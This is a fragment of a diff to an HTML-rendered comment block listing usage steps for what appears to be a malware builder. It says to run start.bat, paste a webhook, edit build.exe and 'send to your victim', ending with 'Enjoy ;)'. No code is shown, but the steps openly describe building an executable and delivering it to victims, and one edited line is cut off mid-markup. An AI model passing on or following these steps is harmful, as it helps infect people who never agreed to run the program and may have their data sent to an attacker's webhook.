@@ -18,9 +18,9 @@
   
   <pre><span class="pl-c"><span class="pl-c">/*</span></span>
 <span class="pl-c">  *- Run start.bat</span>
-<span class="pl-c">  *- paste your webhook in /dist/input folder</span>
+<span class="pl-c">  *- paste your webhook 
 <span class="pl-c">  *- Name of the .py</span>
-<span class="pl-c">  *- Edit build.exe and save(without .exe)</span>
+<span class="pl-c">  *- Edit build.exe and save</span>
 <span class="pl-c">  *- send to your victim</span>
 <span class="pl-c">  *- Enjoy ;)</span>
 <span class="pl-c"><span class="pl-c">*/</span></span></pre>
